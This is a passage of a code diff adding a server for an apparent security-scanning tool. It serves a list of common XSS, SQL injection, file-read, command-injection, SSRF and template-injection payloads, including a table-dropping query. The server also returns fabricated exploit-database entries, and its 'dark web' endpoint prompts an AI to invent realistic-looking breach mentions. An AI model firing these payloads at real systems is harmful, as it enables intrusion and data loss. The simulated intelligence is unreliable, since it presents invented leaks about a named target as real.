+          if (html.includes('shopify.com') || html.includes('cdn.shopify.com')) addTech('Shopify', 'E-commerce', 100);
+          if (html.includes('magento')) addTech('Magento', 'E-commerce', 90);
+          
+          // Analytics & Tracking
+          if (html.includes('google-analytics.com') || html.includes('gtag')) addTech('Google Analytics', 'Analytics', 100);
+          if (html.includes('googletagmanager.com')) addTech('Google Tag Manager', 'Analytics', 100);
+          if (html.includes('connect.facebook.net') || html.includes('fbq(')) addTech('Facebook Pixel', 'Analytics', 100);
+          
+          // Local Development Tools (for localhost scans)
+          if (hostname === 'localhost' || hostname === '127.0.0.1') {
+            if (html.includes('/@vite/client') || html.includes('__vite_is_modern')) addTech('Vite', 'Build Tool', 100, undefined, ["Development server detected. Do not expose to public network."]);
+            if (html.includes('webpack-dev-server')) addTech('Webpack', 'Build Tool', 100);
+            if (html.includes('hmr') || html.includes('hot module replacement')) addTech('HMR', 'Dev Feature', 90);
+          }
+
+          if (tech.length === 0) tech.push({ name: 'Unknown Stack', category: 'General', confidence: 50 });
+          
+          // Remove duplicates
+          const uniqueTech = Array.from(new Set(tech.map(t => t.name))).map(name => tech.find(t => t.name === name));
+          
+          result = uniqueTech;
+        } catch (e: any) {
+          console.error("[Scanner] Tech stack detection failed for", target, e);
+          result = [{ name: 'Target Unreachable', category: 'Error', confidence: 0, error: e.message }];
+        }
+        break;
+
+      case 'payloads':
+        const pType = (req.query.type as string || 'xss').toLowerCase();
+        const allPayloads: any = {
+          xss: [
+            { content: "<script>alert(1)</script>", description: "Basic XSS test", risk_level: "medium" },
+            { content: "<img src=x onerror=alert(1)>", description: "Image tag XSS", risk_level: "high" },
+            { content: "javascript:alert(1)", description: "Protocol-based XSS", risk_level: "high" },
+            { content: "<svg/onload=alert(1)>", description: "SVG-based XSS", risk_level: "high" },
+            { content: "';alert(1)//", description: "Breaking out of JS string", risk_level: "medium" },
+            { content: "\"><script>alert(1)</script>", description: "Breaking out of HTML attribute", risk_level: "high" }
+          ],
+          sqli: [
+            { content: "' OR '1'='1", description: "Classic SQLi bypass", risk_level: "critical" },
+            { content: "admin' --", description: "Username comment bypass", risk_level: "critical" },
+            { content: "'; DROP TABLE users; --", description: "Destructive SQLi", risk_level: "critical" },
+            { content: "' UNION SELECT 1,2,3,user(),database() --", description: "Union-based SQLi", risk_level: "critical" },
+            { content: "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) --", description: "Time-based blind SQLi", risk_level: "critical" }
+          ],
+          lfi: [
+            { content: "../../../etc/passwd", description: "Linux password file access", risk_level: "high" },
+            { content: "..\\..\\..\\windows\\win.ini", description: "Windows config file access", risk_level: "high" },
+            { content: "/etc/passwd\0.html", description: "Null byte injection (older systems)", risk_level: "high" },
+            { content: "php://filter/convert.base64-encode/resource=config.php", description: "PHP wrapper LFI", risk_level: "high" }
+          ],
+          rce: [
+            { content: "; id", description: "Command injection (Linux)", risk_level: "critical" },
+            { content: "| whoami", description: "Command injection (Windows/Linux)", risk_level: "critical" },
+            { content: "`cat /etc/passwd`", description: "Backtick command execution", risk_level: "critical" },
+            { content: "$(id)", description: "Subshell command execution", risk_level: "critical" }
+          ],
+          ssrf: [
+            { content: "http://127.0.0.1:80", description: "Localhost SSRF", risk_level: "high" },
+            { content: "http://169.254.169.254/latest/meta-data/", description: "AWS Metadata SSRF", risk_level: "critical" },
+            { content: "file:///etc/passwd", description: "File protocol SSRF", risk_level: "high" }
+          ],
+          nosqli: [
+            { content: '{"$gt": ""}', description: "NoSQL injection (Greater than)", risk_level: "high" },
+            { content: '{"$ne": null}', description: "NoSQL injection (Not equal)", risk_level: "high" }
+          ],
+          ssti: [
+            { content: "{{7*7}}", description: "Jinja2/Twig SSTI", risk_level: "high" },
+            { content: "${7*7}", description: "Mako/FreeMarker SSTI", risk_level: "high" },
+            { content: "<%= 7*7 %>", description: "ERB SSTI", risk_level: "high" }
+          ]
+        };
+        result = allPayloads[pType] || allPayloads.xss;
+        break;
+
+      case 'exploits':
+        const query = req.query.target as string || '';
+        // Simulated exploit search logic
+        result = [
+          { title: `${query} - Remote Code Execution`, id: "EDB-12345", date: new Date().toISOString().split('T')[0], author: "CyberSuite_AI", type: "Remote", platform: "Multiple", poc_url: "https://exploit-db.com/exploits/12345" },
+          { title: `${query} - SQL Injection`, id: "EDB-67890", date: "2024-11-20", author: "Security_Analyst", type: "Webapps", platform: "PHP", poc_url: "https://exploit-db.com/exploits/67890" },
+          { title: `${query} - Privilege Escalation`, id: "EDB-54321", date: "2024-05-12", author: "Kernel_Master", type: "Local", platform: "Linux", poc_url: "https://exploit-db.com/exploits/54321" }
+        ];
+        break;
+
+      case 'darkweb':
+        const dwTarget = req.query.target as string || '';
+        const dwApiKey = process.env.GEMINI_API_KEY;
+
+        if (!isValidApiKey(dwApiKey)) {
+          result = [
+            { source: 'BreachForums (Simulated)', date: new Date().toISOString().split('T')[0], threatLevel: 'high', snippet: `Potential database leak detected containing references to ${dwTarget}.` },
+            { source: 'Pastebin (Simulated)', date: '2024-01-22', threatLevel: 'medium', snippet: `Configuration file snippet found with IP/Domain ${dwTarget} exposed.` },
+            { source: 'Onion-Leak (Simulated)', date: '2023-11-05', threatLevel: 'low', snippet: `Target mentioned in a list of potential reconnaissance targets.` }
+          ];
+        } else {
+          try {
+            const ai = new GoogleGenAI({ apiKey: dwApiKey! });
+            const dwResponse = await ai.models.generateContent({
+              model: "gemini-3-flash-preview",
+              contents: `Perform a simulated dark web intelligence search for the target: ${dwTarget}. 
+              Generate a JSON array of 3-5 realistic-looking dark web mentions or breach intelligence items.
+              Each object MUST have:
+              - 'source': Name of the dark web forum, marketplace, or paste site (e.g., 'BreachForums', 'Exploit.in', 'Dread', 'Pastebin').
+              - 'date': A realistic date within the last 2 years (YYYY-MM-DD).
+              - 'threatLevel': 'low', 'medium', 'high', or 'critical'.
+              - 'snippet': A short, technical-sounding snippet of the mention or leak (e.g., 'Found SQL dump with 50k records referencing target domain').
+              Make it look like real OSINT data.`,
+              config: { 
+                responseMimeType: "application/json",
+                tools: [{ googleSearch: {} }]
+              }
+            });
+            result = JSON.parse(dwResponse.text || '[]');
+          } catch (e) {
+            result = [
+              { source: 'BreachForums (Fallback)', date: new Date().toISOString().split('T')[0], threatLevel: 'high', snippet: `Database leak detected containing references to ${dwTarget}.` }
+            ];
+          }
+        }
+        break;
+
+      default:
+        res.status(404).json({ error: "Tool not found" });
+        return;
+    }
+    
+    scanCache.set(cacheKey, { data: result, timestamp: Date.now() });
+    res.json(result);
+  });
+
+  // CVE Proxy to avoid CORS issues on localhost
+  app.get("/api/cve/:id", async (req, res) => {
+    const { id } = req.params;
+    try {
+      const response = await new Promise((resolve, reject) => {
+        const request = https.get(`https://cve.circl.lu/api/cve/${id}`, (res) => {
+          let data = '';
+          res.on('data', (chunk) => data += chunk);
+          res.on('end', () => resolve(JSON.parse(data)));
+        });
+        request.on('error', reject);
+      });
+      res.json(response);
+    } catch (error) {
+      res.status(500).json({ error: "Failed to fetch CVE data" });
+    }
+  });
+
+  // CVE Search Proxy
+  app.get("/api/cve-search/:query", async (req, res) => {
+    const { query } = req.params;
+    try {
+      const response = await new Promise((resolve, reject) => {
+        const request = https.get(`https://cve.circl.lu/api/search/${query}`, (res) => {
+          let data = '';
+          res.on('data', (chunk) => data += chunk);
+          res.on('end', () => {
+            try {
+              resolve(JSON.parse(data));
+            } catch (e) {
+              resolve([]);
+            }
+          });
+        });
+        request.on('error', reject);
+        request.setTimeout(10000, () => {
+          request.destroy();
+          reject(new Error('Timeout'));
+        });
+      });
+      res.json(response);
+    } catch (error) {
+      res.status(500).json({ error: "Failed to search CVE database" });
+    }
+  });
+
+  // AI Generation Endpoint removed from here (moved up)
+  
+  // Global scan history storage
+  let globalScanHistory: any[] = [
+    { target: 'enterprise-node-01.io', score: 88, type: 'Full Scan', time: '2 mins ago', user: 'cyber_ghost' },
+    { target: 'api.fintech-secure.net', score: 42, type: 'Web Scan', time: '15 mins ago', user: 'root_admin' },
+    { target: '104.21.44.12', score: 15, type: 'Infra Scan', time: '45 mins ago', user: 'sec_ops' },
+    { target: 'dev-portal.internal.cloud', score: 94, type: 'Deep Scan', time: '1 hour ago', user: 'shadow_walker' },
+  ];
+
+  app.get('/api/global-history', (req, res) => {
+    res.json(globalScanHistory);
+  });
+
+  app.post('/api/global-history', (req, res) => {
+    const { target, score, type, user } = req.body;
+    const newItem = {
+      target,
+      score,
+      type,
+      user: user || 'anonymous',
+      time: 'Just now'
+    };
+    globalScanHistory = [newItem, ...globalScanHistory].slice(0, 20);
+    res.json({ status: 'ok' });
+  });
+
+  if (process.env.NODE_ENV !== "production") {
+    const vite = await createViteServer({
+      server: { middlewareMode: true },
+      appType: "spa",
+    });
+    app.use(vite.middlewares);
+  } else {
+    const distPath = path.join(process.cwd(), "dist");
+    app.use(express.static(distPath));
+    app.get("*", (req, res) => {
+      res.sendFile(path.join(distPath, "index.html"));
+    });
+  }
+
+  app.listen(PORT, "0.0.0.0", () => {
+    console.log(`Server running on http://localhost:${PORT}`);
+  });
 }
+
+startServer();
